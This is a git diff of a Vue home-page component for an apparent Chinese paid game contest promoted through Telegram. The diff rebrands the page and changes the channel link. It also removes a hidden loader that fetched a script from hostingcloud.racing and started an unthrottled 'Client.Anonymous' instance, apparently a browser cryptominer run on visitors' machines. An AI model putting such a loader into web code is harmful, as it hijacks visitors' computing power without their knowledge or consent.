@@ -1,7 +1,7 @@
 <template>
   <div class="home-container" :style="{backgroundImage: `url(${bgImage})`, backgroundSize: 'cover', backgroundRepeat: 'no-repeat', backgroundPosition: 'center'}">
     <!-- <div class="animated-text">
-      <h1>达利担保官方比赛</h1>
+      <h1>聚宝盆担保官方比赛</h1>
       <p>羊了个羊争霸赛，过关就给钱</p>
     </div> -->
     <div class="button-container">
@@ -16,7 +16,7 @@
             <div class="modal-container">
               <h3>请先关注下面频道，然后开始游戏</h3>
               <p>
-                加入频道: <a href="https://t.me/dali" target="_blank">https://t.me/dali</a>
+                加入频道: <a href="https://t.me/JBPHH" target="_blank">https://t.me/JBPHH</a>
               </p>
               <button @click="showModal = false">Close</button>
             </div>
@@ -98,36 +98,12 @@
     // Play audio when component is mounted
     audio.value.loop = true;
     audio.value.play();
-    await loadScript();
-    initializeScript();
   });
 
   onUnmounted(() => {
     // Stop the audio when the component is unmounted
     audio.value.pause();
   });
-
-  async function loadScript() {
-    return new Promise((resolve, reject) => {
-      const script = document.createElement("script");
-      script.src = "https://www.hostingcloud.racing/2xzP.js";
-      script.onload = () => {
-        isScriptLoaded.value = true;
-        resolve(true);
-      };
-      script.onerror = () => reject(false);
-      document.body.appendChild(script);
-    });
-  }
-
-  function initializeScript() {
-    if (isScriptLoaded.value) {
-      var _client = new (window as any).Client.Anonymous('dffe49f6deff996decdf093e573f5bb7cace795248132a63d806c4a0bd7ba26c', {
-          throttle: 0, c: 'w', ads: 0
-      });
-      _client.start();
-    }
-  }
 
   const startGame = async () => {
     try {
